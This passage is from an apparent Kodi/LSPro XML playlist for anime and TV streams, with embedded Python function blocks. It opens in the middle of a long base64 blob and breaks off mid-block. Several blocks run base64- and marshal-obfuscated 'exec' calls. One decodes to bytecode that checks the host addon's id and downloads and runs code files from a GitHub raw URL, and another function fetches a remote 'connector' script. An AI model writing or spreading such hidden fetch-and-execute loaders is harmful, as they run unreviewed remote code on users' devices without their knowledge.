kJOVVZwdFFXMVdNRTEzVERCQlVVd3hRVzFJYWtGUmVEQk5VVmQ2UVcxRU1scHRXalJCUjNBeVRVZE5kbHB0VmpOTVIzRjFRWGRNTUVGUlJYZGFiVll3V20xTU1rRlVVakpCUjAxNFFYZElNRXhIY0RSQmJYUXlRa2RhYlVGNlNEQkNSMXB0V20xME1WcHRUWGhhYlV3eVFXMWFiRUZIVWpCQmQxb3dRVzEwYlVGUldqRkJkM2d5V2tkd01rRkhVbTFhYlZveFFXMWFNa3hIVEd4QlZFd3pRVzFNTWtGM1dqQkJSMDE1UVRKU00wRlJTREJCYlZvd1FYZEpkVUZSV2pGYVVVVjJRVzFJTWxwSFNEVkJSM1F6UVcxd2JVRjNUREZhVVVWMVFWUk1NVUZSV20xYWJWSXdURWRhTkVGNlNETkNVVm93UVcxU01scDNjREZhYlU0eFFWRmFNbHB0ZEROYVVVd3hXbTEwTVV4SGNYVkJlbFl6UVVkSU1FRlJWakpOVVZveVFYZFdNVUYzU0RWQlZGSnNUSGRNYkVGS1VqSkJSMGd5UVZGU2JVSkhSR3hCUjA0eFFrZE1ORUZIU0RKTlIwVjJRVlJXYlVGUlNEVkJSM0J0UWxGYU0wRlJSREJNUjNCclFYZFNiRTEzUlhaQmVrZ3lUSGR3YkVFeVVqRk1SMGh0UVVkT2JVRjNjR3RhYlZJeFdtMU1NbHA2VmpOYVIxcHJRVWR3YlVKUlJYWkJkMGd4V25kTmQwRjNWbTFCZDBWMVFVZHdNVnBSUlhWQmQzQXhXbmRJTUVFeVVqTkNSM0J0UVcxRU0wSkhTRFJCZDB4dFduZEliVUZ0UkRKQlIwMTJXbTF3TTBKUlREVmFiWEF4UVhkRmVFRlVURE5DUjBReVdtMTRNazEzVERSQlIxSXlXbTFFTWxwdFVqTmFVVmQ2V20xRWJVRkhSRFJCYlZJeVFYZHdNVUZ0U0RGQlIwZ3lRWHBFTUZwdFRERkJla1F3UWxGRU1rRjNlREZDVVV4dFFYcE1NVUZIY1hWYWJYUXlUWGRFYkVGSGVERmFkMWQ2UVVkSU1GcHRjR3hCVVZJeVRFZHdNa0YzU0cxQmJVZzFRWHBFTTBGSFRERkJkMUl3UVZGYU5GcHRjREJhYlhBeVFVZDRNRnAzY0cxQmQzUXlURWROZGtGUlJESk1kMFJ0UVZGU00xcHRUWGRCZDB4dFduZE1ORUZ0Y0RGQ1VVdzFRVzFNTWtGUldqSkJiVTR5UVcxRU5FRlVUREJDVVhBMFFXMVNNVUpIVERGYWJWb3lXbTFGZFZwdFVtMUJVVVYzUVcxSU1FSkhWM3BCZWxZd1FWRklNa0Z0UkROQ1IwZ3hRWHBJTVVGSFNHeEJlbFl4UVVkYU5FRlVURE5DUjBsMVFXMU1NRTEzY0RWQlIzZ3hRWGRNTkVGUmRETk1SM0JxV20xd01FSlJURFZCVVV4dFFXMUZka0ZVVERGYWJYQXhRVzE0TUZwSGNESkJSM0J0V25kRWJVRjNSRzFCYlVWNFFYZDBiVUZ0U0RSQmQxSXhXbTFYZWtGdFdqRkNVVWd5UVhwU01scHRTWFZhYlU1dFdtMVhka0Z0UkROYWQxcHNRWHBNYlZwdFRYWkJSM1F5VEhkSWFrRlJXak5NUjBneVFYZHdNMEpIUkd0QlIwNHdXbmR4ZFVGNlNEQk1SMGh0V20xT01VSkhXbXhhYlZveldrZEZlVUYzV214TmQwUTFXbnBXYlVKUlJETkJVWFF5VEcxSU1scHRSRE5CVVVodFFYZFNNVnB0V2pSQmVreHNUWGRFTWtGdFNERkJVVVF3UVhwU01rMUhSRFZhYlZJeVRVZEZlRUZVV2pKQmJVVjVRVlJhTVZwM1RESmFiWEF3V2tkTU1GcHRVakZhUjBoc1FWUkVNazFIY0d0WGFqQlliakpKTlc5S1UyVk5TMVowUTBaT1lXOUlhakJCTTFKc2JtMU9OVnBKVFU5S1IwMUJTRWhXTVZnd2RETndlbWRqY1ZGYU1rRjZUVmhFUjNScVRUTkpTMGd6ZVROTVNVNHlSRWxKWW01UlFWWkdiRGxuUjNwU2EyOUxUR1ZHTVhGUFRFaEJlVmd5U1VSd2VHZEZSRWc1YmtadFVtbElWVmROYmxGeFlVVXhjVUZ1VlhsWlRWSm5VMFF5VERSSFVuVllSMGxFYWtkTFNVOWFWRm95UmxKRU1Wa3dhekZHTTJKcVIyMVdiWEZKVEd0dWJYRmljbUZKVUVsdFNHdHVTMDlYVEhkUE5uQkplRFZhZG1kNlFURk5NSEF5TVhkRVNtdHNXREpTYTFwUlJWaEJZWEF4VFRCeFdIQjNkVFp1VlZOSlFYaEZiVzlIZVdGeFZWZEVia2hOVmxneGRXTkNWSGhyV2tkYU1FeEpSVFpLZDNscFFrdDVhRUpKZVhWS1NFeHFRbFF4V0c5VlJYaGFkM2x0U0ZGT2FVbFRlWGRhU2tWdVIwcDBNMjVLVTB0RlZWTmpXa2cwTlhCM2RVbHZkM1ZJVFRCblFVSkxkR1Z5WVV4dFNESnhkVVZLY0dWSk1YQXhibFZCZDBsdFNUTmFVRGxtYnpCNVdFVnRRVUp3U0dwcVRWTlhhMHd6VTFCdmVXTnRSVXQ1VTBkSFYyVmFlVUV6VEd3NVZWcFNhMDl3VWtGVVNrbDFhbTh4V210SWVIQnRSWHBOVTBaNk9EVkhTMEZwUVVkVFJVUmhVek5KVW10NlJFZEpSRzV0ZFdkRk1sb3ljREpYU2xreFRtVklNSGd6Y25kTmJGcDVRWGh3WVhScmJrbHdhVzh6ZFZKR2QzVlJiekJpTTB4TGNXRllNMEZJYmxGMGFYQklWek5CUzFZMVFWSkJOVmd4VFd4eE1rbGxXbUZGWmtGM1FYZHlkamxKU0RGVE1XOHpTR3B4U25GUVRUSnhSM0JHT1ZGQlMxZHJRV0ZpTUhGNFUxVkdNa2w2U1ZKQmJHOTVZakZGYlZkSlRUQjRORnA2WWpSRlNrbGhRbE5GUmtRelltMXdTbE5GU0ZSd2JVY3dTR3RNZW1KdFNYZ3hTMEYzVFZsSk1qaHFXbEpNTlZreVowOU5TVTFUU1ZBNVQwMVRjV05KTWtWbVRYcHhUMFI0VTJOSGVtbzFXREZPTUVsSlRtVkZTMDkxY0ZGTWJWb3djVEpCU1hsRFRVb3hZMjlWZURKWk1YbG1SREZCUlZwU01XTkZlVlpxV1RKMWFFbHRWekZLUjNSbFJFbDVVRm94UVdaS1NXSnNSVlJ4WkVWVU5HbEtlR0p0UkhwMWVVcGhWek5hVVhsNFJuWTVUMGRLU0RWSFMzZzBTSHBTTW05c09ESkllREY1Y0VvNGFVbDVkVXB5VlZOdVFURkZhRUZUU0RGdVNtWnFSRE41TTI1aFUwVnlla2wxY1RKSlUwcExTWGR1VTAxSFRFcDRhbTkzY1Vwd1NtdElSWGQ1VWxwSVUyWkdNWGcwYjIxMVowVXlOVWx1VWxOWFNsUkpaSEV6ZFRSYWQxZE1SbEZ4TTBwU1NVRklNbkZoVFhweFFrWkxkR3h4VkRRMWIyeG5iVXhMVDFOd1lYaHBUVlF3YW01VmNXTndVVm8wUmxRNFpVcEtTVWxFZW5VMlJXRkphazEzUVdKR1NGZDRiMHRUTmtnd1owZEVNbkJwYnpOWGRXOVNPVXRHVlhGTlJYZzRNMFl5WjA5TlUwMWhTbFF3TlV4NVkyZHZNMEYxY1hablNFMHllVE52TUdkQ1duaHhXRWN3ZUROR2VsbzFTSGhOWTI1dGNUQlpNWEZqVEV0SldtOHpjVzV5VkhGVVJucE5lVWhKWW1WTlVWTmpjRlZKVmtaNk5VRkllVUV3U1VkYWJVUXdXbTF3ZVVWdFNubDFiRnB0UldKWWJVRkhXVE53YlhKaFRWUkplR0kxU0habmEyOWhZalJOTWxOVFRFbElhbTR6VFVWSmVFVXhXa3BUVTBwS2EzWkJNMk5RVEVoblNrVXplVUZ5ZUdKbFdsVkpZVWhVT1dWdU1EbEJSMVZOVUc1UVptbEtTMWREYmtoVFVrMUtlVTFHTVdOSGNWSTBiRXBMVmpGRVNYbDVTbmxqYlVwM2RHMUlWVTlqUmtabU5YQjRPRzFhYlVsTlRURnhSMW95VFZkSk0wbDJTa2xUYUc1S1oySkJVVVZrU2tkVFpFMUhkVEpDU0hGSFRWVlRlbkF6VTBsdVZFdzFibE5GV25KSFFWcEZWREZoV2pGaWEzRktTR2x4UjNsMVNEQkVOVXhLVEdWQk1sZHJTRzFOVVV4M1NXVnVTR3RpY1VoWGVscEtTVkZ2TW1JeFdXMUpXRTFVYW0xWWJHWXlXa3RYV25GUlFVeEJNRGhzU25weFZtOUxVakZ1ZUZvMVRWVk5kVUpMVFhsd2JVRldiMnc0TUUxNVVtVnZiRGxoY2xWQk5FWkpjRE5HVTAweWIzcHJNazB6VXpKdU1VbG5TVXRUZGxreFUwdHZTbmxzUVRCRlFVMWhSVWRCZUdwbGIwcEZabHBWVjJGQ1IwZ3hTRXRhYW05VU9ESkpiR2REVFcxU05WZ3lPVWRDU0dkRVIwdDViVzUzUVdaR1NtbzFiMVJqTkVkVlFYVk5iVm95UWxGWE1VRXpUVVp2UjNGVlJqSmlhMFIzVDJKSFZHSnRjVlZUZFVSdFYwMUtTM2hyV2pGeFUwRXlkVkJFZUUxc2NsTkJTRVl5Y1ZKdk1reGxXRE5qU0VGNFYxWkpkMGxrY1RGaldrbHNaekpHZWpWYWIwaG5iVXd5TkROSFNrbFFXbFJUV1hBeGVYbElTM2xWY0hsVFEwVnRkR3BJVkUxb2NUQnhTRzVVTVhkSlZFMWtSVlZ4YlVaU09HbE5TbW8xU0VwNVZIQktPVEZGU2tGaFJqTlhaMFl4ZVdkR1ZYRmhja2RJTUc4eFYxZHVkMU5yUlVoalpsa3dWMFJ5ZUdkUldUTmpRM0Y0U1ZOQlVYRlpRWGRYTUVSM2NXSndkbWRRV2pCalNXOVJTVmxGTTFkRFJWTmpVSEZoVjJwSWVrbFpXbTFTTWtoaFQydE5VM0ZqUm5abU1FSlNOVlp1U0ZkdVdURkJka0ZMUlZkYVVtTnNTRzFYU1VSS1FUUklNazFyYnpCMU1raFJTV1ZFUjNBMGNIbE5XRzlLYW0xSFZYQmxTRzFNYVUxNGVVbENTbmxFV2xSalUwaFVTVmhKVkhsSldESTFaa1JJVjJGYWJHWmxURWxJYkVRd1ozVmFVWGxuU0RKck5VcFVNV3RGVW5WQmJsUk5UVnBJYW14d2JWSnJSa2RXTkhCNFVtdFlNSFYyUjBZNVJYRXlhMlpNUzAxQlNrbzBaVVl5U1ZWQlNHTlpiakExWTBKU2RXWkhNbWRUUkhkeFZVeEtVMnhKU0d0VFJqRlRVVTFMVTNoTlZVbFFjRVk1TVVodGRHbEJTbkF6UVZCbldFbFRlR2xLU1ZOVlJUSkJXRzh5Y1d4SFIxTmhSMGRQWVZwUlRYZHVValY1VFRKMGJYQlNZMmRaYlZjd2JraFNhWEZJTVVaQlNqRmljVEJtYVVGNlRVeEtVWEZpU1hkSlMxcDRSVnBCUjNsSlJVbEZRMDEzVFcxTlNVRlhjSGhuWTAweFYyTkNVbVl5Y25ablpGcExRVmR3TWprMWNERlBZVVpWVTFWd1NtZGhSMUZhTlVKS05WcGFSMGxwYmxWYU0wVXhSREJFUzNsc1JucGpiVUV5ZVVKdWVFMDJSVWhKVTBReGVXRkJTbE5yUWtkSmRVRjRNV3BhTUd0alRVbGpTMjR6VjJoeGVVbHBjRlE1TTAxNVUwOUlNMDlqUjFGQmJFSktkVTFhVkZkNlduZFBkMjh5Y0RCRVNVVkJXVEo1UmtaNk9VWnVTa2xuY2tkNVIyOTRTR1ZHZUVWaFdqSkZTVVI1Y0d4R1ZYRlVjR0ZCZVhCaFFWVk1NMGxFYjFONVNtOVJXbXh4TVhReVFVcHJUVTFSU0dwTmVubFFSWGQ0TlVaaFQwdHdlVmRXY0VablowUkhVMVpHZWtsdFJraEpNa0pJWTJKdk1GTnFSbmg1VmtjelFWaEViWGwyV2xJMVFYQkhUR3hJTW5WRWJ6RndNVXd5TlRCSmVYVm1SVWRXTTBWVWNVUk5TMU5IU1RKMVkzRjZZakphTVZKbGIzZE1iRVZoWTNWd2QxcHJRWGxqV25CS2NUUnVVazFaY1V0amFYQkllWFZNU0hGaWJucEphVnBTTVU5QlNrUmxUVzFCVEhGNlNUWnZTalV6UmxSNWVFbHRSVVpIVkVWVldrdEpWMjU0T1cxQk0wRnViMGhuWVV4SFRWQkJVM2x1VFZGeFlVcEhVMHRNUjAxQ1FYZFhkbTlzWnpCRlUxTlhja2xqVVUweVYyZHdNWFV6UmpCeE5VZHRSV1Z3UzJJMWJqTnhiRVIzZVVsSE0za3piekJGYkVZeFYzcHVNbmxOUlhsVFNFcEtPR3R3UjA5VFdESlhla2h0Y1UxR1NWTm5TVEJOZDNCUU9VaENVbkZoVEd4bmRuQktkVU54VWxwcFNURlNORVY0WjJGSllYbE5ibTFCYVhBd1FURnZSamw1Um5wSWEwZFNZek5GTVVneFJtRnhSVm93ZVROQ1NWZHJSbFExWW5CTFRXbHVZWFYzVEVoQlQwUjVRV1ZaTTBscVNGRjVVMFYyWjFsd1IxSmxURXRYVVV4Nk9VUkVTbEl6U25kWE5FaFZUelZ4ZW5nd1JHRkJVa2g2T1VKWU1VMVJjRE4xWmxnelFXUkhlbWMwV2t0SmRVZ3dhak5hTWtGc1FsTjVSVUZLTlhwd1MzaHNjVXR4YVhBd1oxWkJNRUZwUmtneGFuQkxlWGh1U25nMVJWSk5ZM0V3UlVaeFNqbDFSa3BJTkc4elRERkVTamxoYm0xQlRFWkpXak5OZDAxalFUQk1OVzVMWTJWRk1WZHRja2hKYTFwNlJHVndNblV5UkhkRllrRnRUMkZ2VW10aFRWRkliVzVVTUd4SlUxSTFRVEJxYVVsSFJXSnVTVlpsU1RGQmFXNHlPVXBOZDFZemIzbEpkMjVWUlVSeVUwMVJRWGRFTlUweFNWbE1Na2w2V1RGRmEzQXpZMjF5ZDBGMVJqSlhNMXBLTldOTWVtZDNSMHRhTTBWTFFUSmFNRk41U1RGMWFXNUxUV3RIYlVGSFFVZEZWMFpoUVc1R01sWTFjREZUWmxwNWVXeEJlbGRzUkRKRWFVSkxZMkZLUjAxSFJHRjFhWEJTWm1WSVZGTmtSM294UjFneGRXMUhTblZ1Y1RBNVdVRlVjVXBITVdNMlFrcDFVVzlJUlZsQk1IQXdjWGhhYW5GSlVqRlpNVTgxVFVwblVIQjZXakphUzBrelIxTjVTVzVUY1haeVlVRklTVWQ0YlVkc1oyeEJlbE5uYmpKWE5GcFJVelJITUVGVmJ6QTRNRVpHT1d4SGJYbElUVk5FYkUxVllqVkZTR2RMY0ZJeFFWZ3pZelZHU0UxblRHRjBNMjU0WjA5RmJVbFlSakowTVhFeWRVeElSMFJsUlVsMGJVMVFPVkZNUjBGaVNubGpXa3g0T0ROdlNtTklia3R4VUV4NE1EUklkMGxOU0VwclNVUklNR1ZHYlVWaWNESjRaVzk1VXpaQlNFRnVUSFpuVVc1VFkyTkJlbmwxV0RKTU0xb3hTR2xDVW10TldURkphbTlLZVVkQ1VtTlVSMVZPTTFreVkySnlVVk40YmtkQlkyOUtPR1ZCU210alRVdFRWMEZTUVVOd2VGbzFjRzF4UjBZd1NHVmFNa1ZWU0VsT01FbEtaMUpZYlVGM1IxSmFaWEJVWTJKSVVYa3dXREZCVDBsVVREUklTbmxsUlhoTlZVSktlV0p3VURobFJHMUVNM0I2WTNWS1MwbFBSSGxOV0VaUlRqRkVkM2d6YnpCQk5sZ3lSVmhGVW1wbGNHMXdiRzlJVjIxdWQzZzFXREpTWlc5NFRWUk5ZVm8wY0RBeFVXOUhRVkJIU0ZkdFdESXhTa3BRT1d4d1ZVNHlia3RYVFZreFNHMXdNVlpsUVRGNGJWcDRlWHBJTUV3emNVaGFORWRVT1dOQ1ZIaHFibEphTkUxTGNUWk5SbWRVUmxBNVZYQjVlVmxKUzFkWlFUSkJVVnBIZFdKeWQwMUdiek4wTTNCNFpqRlliWEJ0U25oNVRFSklSR3RhZVZabGJsRjFaa3BTZUdwTlIwRnRRVkZ4ZVc1SGRHVlpNM2xpUm14bmFrSktVMHR3U0ZjMFduZHhRMFY1WXpCdlVEZ3pXREZKUkVKU2RWbHZVRGd3Y1dGeGVXOXRVMjVFU2xNMVdUQm5RbHB0ZVVWSWJYVnBSakpKVFc5VVNWSnlkMVl6YjBsTlYwRjZTWHBHWVhWcGIxRjRiVXBHT1VSeVNIRlpjVlF4VVVsaFYxRnlVM0ZoV0RKTWFrZElaMk5CU0RGRFFVbGphMDFTV20xSk1rZ3pSMGQxYW5BeWRHMXVTWFF6VFZONU5FUkdaMGhFU25ocGIwbE9hVXhJUVd4S1IzVkdTRzF4WkhKMk9HMUdNbmhsU2xGUFVFWnRTV3BKVVVnd1dsQTROVzlzT1RWWk1VUnRXVEoxTkVSS1VqTkVkamcxYjNvMVVFUXlaMjVaTUZJMGNGUkpiWEZ0VW1WQk1FdzFXVEpqZDBoVVVtdFliWFV4U1ZKQmQzQXhSV05CYlhsQ1dtMTVaMWt4Y1dGWmJVbGhRa2ROVWxreWVHdHZSM0JwUWxGSloxZ3hSVFpDU0VGa1RHMTVORnBWY1c1Q1NrUnNSREZCYlc1R09XTk1TV05xYjNoQlZFVlRUVFZ2U0VWTFdUSm1aWEpJY1cxSFZWTlJUSFpuVW05UVoxRndiR1psV1ROV2JXOTRhMlp1YkdkUGNHRjVZMEY0ZURSYVZFaGxSakYxUlV4SGVHbHVNMEYzVEV0RU0zQXpZbXRCUjNWQ1FYbDRhVnBSUVcxSlUzRlBXbXc1VlhCVVZtbFpNM1ZIU1RCMVIwRlNTVFpJVURsSlJHMU9iVmt4V21WYWJEbFFjVEl4VDBZeVZtbENVbHBzVEVZNE5VcEtjRFJ1YlZZMFIwZEJkVUZ0ZURSQlJqaHBRbFIxWTFsc09UTk5NbmxSU1d3NFpXOUhURFZaYkdkdFJqQnJTVnBVY0RSQ1IzaGxSRWxUU2tkVVRHRlJSR00yYmtvNWFGWlJNSFJYTVdzMFFXMVhjSEpSVFhwTFZYUXpRVk5yTkZwdFUzQnlVVnB0VjJvd1dHOTZTV2xXVVRCMFRVdE5kVzlRZEdGTFZYUXlXbmxyTkVGM2VYQnlVVTE1UzFWME1scEphelJCYlVGd2NsRk1iVXRWZERKQ1NXczBRWGQ1Y0hKUlYzbExWWFF6UVVsck5FRjZTWEJ5VVV3MFMxVjBNa0ZKYXpSQmJYVndjbEZOZDB0VmRESkNTV3MwUVhkTmNISlJjRFZMVlhSc1FsTnJORUY2UlhCeVVVMTZTMVYwTTFwNWF6UkJiVTl3Y2xGTU5FdFZkREpCU1dzMFFXMUpjSEpSY0cxTFZYUnNRa2xyTkZwM1RtRllSazVsVmxSSk1reEthbUpYTVdzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVXh0UzFWME0xb3hhelJhZWtsd2NsRk1NRXRWZERKQlNXczBRWGRCY0hKUlRYcExWWFF5UVZOck5FRjNTWEJ5VVZZMFMxVjBNMEZUYXpSQmJWZHdjbEZNTlV0VmRESk5TV3MwUVhkNWNISlJjREJMVlhRelFrbHJORnA2UVhCeVVWWnFTMVYwTTB4SmF6UkJkM2x3Y2xGTmVrdFZkREpOU1dzMFduZDRZVmhHVG1WV1ZFa3lURXBxWWxjeGF6UkJkMWR3Y2xGTU5VdFZkREpOU1dzMFFYZFRjSEpSY0cxTFZYUXlXakZyTkVGM2VYQnlVVXcxUzFWMGJFMUphelJCYlVsd2NsRk5lVXRWZERKQ1UyczBRWGRKY0hKUmNEUkxWWFF5VERGck5FRjNlWEJ5VVV3eVMxVjBNMEpKYXpSYWQzVndjbEZOZWt0VmRETmFlV3MwUVhkVGNISlJURzFMVlhReVRERnJORUYzU1hCeVVWWTFWMng0ZEZoc1QzbHhlbE5tV0ZCeGNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwTWxveGF6UkJiVUZ3Y2xGWGVVdFZkREpCVTJzMFFYZEpjSEpSVEcxTFZYUXlUWGxyTkVGM1JYQnlVVXd4UzFWMGJFSlRhelJCZWxkd2NsRk1NVXRWZEROQ1NXczBRWHBGY0hKUlRHdExWWFF5VEhsck5FRjNTWEJ5VVhCc1MxVjBiRnBUYXpSYWVrRndjbEZXYWt0VmRETk1TV3MwUVhkNWNISlJUWHBMVlhReVRVbHJORnAzZUdGWVJEQllUVXROZFc5UWRYZHZNakZxYmtwcmVWaFZZMlp1U2xab1RWUkpkMjh5TVdwd2VrbHRjR3gxZGt4TFFYbEJkMFJvVEhkTU1FMVVTWGR2TWtWNVdGUkpNa3hLYW1KWE1XczBRWHBKY0hKUlRERkxWWFF5VFhad1kxaEdlR1pYYld0dGNWVlhZMjk2Y0N0WGJHcGhUVXQxZVV4c2NHTllSRDA5ZEFVQUFBQnliM1F4TTNNSkFBQUFiVzl5Y0dobGRYTWdjeHdBQUFCamIyUmxZM011WkdWamIyUmxLSFJ5YVc1cGRIa3NJSHBwYjI0cGRBWUFBQUJ2Y21GamJHVnpIZ0FBQUdOdlpHVmpjeTVrWldOdlpHVW9hMlY1YldGclpYSWdMQ0I2YVc5dUtYUURBQUFBYm1WdmN3Z0FBQUE4YzNSeWFXNW5QblFFQUFBQVpYaGxZeWdMQUFBQWRBWUFBQUJpWVhObE5qUjBCZ0FBQUdOdlpHVmpjM1FJQUFBQWJXOXljR2hsZFhOMEJ3QUFBSFJ5YVc1cGRIbFNCQUFBQUhRSUFBQUFhMlY1YldGclpYSjBCQUFBQUhwcGIyNTBCQUFBQUdWMllXeFNCUUFBQUhRSEFBQUFZMjl0Y0dsc1pYUUpBQUFBWWpZMFpHVmpiMlJsS0FBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwQ0FBQUFEeHRiMlIxYkdVK0FRQUFBSE1PQUFBQUdBRUdBUVlCQmdFR0FRWUJLZ0U9IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/YcK18g4.jpg</thumbnail>
<fanart>https://i.imgur.com/SKvCy0e.jpg</fanart>
</item>


<item> 
<title>[COLOR orange]FULL ANIME [COLOR yellow](Nuevo)[/COLOR]</title> 
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
from datetime import datetime, timedelta
import re,requests,urllib2,xbmc,time
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
titulo = '[makelist.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
